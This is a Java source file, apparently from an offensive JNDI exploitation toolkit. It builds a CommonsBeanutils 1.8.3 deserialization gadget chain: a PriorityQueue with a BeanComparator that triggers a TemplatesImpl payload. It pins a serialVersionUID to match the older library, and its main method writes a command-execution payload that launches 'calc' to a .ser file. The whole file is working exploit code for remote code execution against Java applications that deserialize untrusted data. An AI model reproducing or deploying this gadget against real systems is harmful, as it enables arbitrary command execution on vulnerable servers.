package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import com.nu1r.jndi.gadgets.utils.Reflections;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.util.PriorityQueue;

public class CommonsBeanutils1183NOCC {

    public static void main(String[] args) throws Exception {
        byte[]           bytes = getBytes(PayloadType.command, "calc");
        FileOutputStream fous  = new FileOutputStream("333.ser");
        fous.write(bytes);
        fous.close();
    }

    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
        final Object template = Gadgets.createTemplatesImpl(type, param);

        ClassPool pool    = ClassPool.getDefault();
        CtClass   ctClass = pool.get("org.apache.commons.beanutils.BeanComparator");
        CtField   field   = CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctClass);
        ctClass.addField(field);
        Class                       beanCompareClazz = ctClass.toClass();
        BeanComparator              comparator       = (BeanComparator) beanCompareClazz.newInstance();
        final PriorityQueue<Object> queue            = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        // switch method called by comparator
        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Reflections.setFieldValue(comparator, "comparator", String.CASE_INSENSITIVE_ORDER);

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = template;
        queueArray[1] = template;

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(queue);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }
}
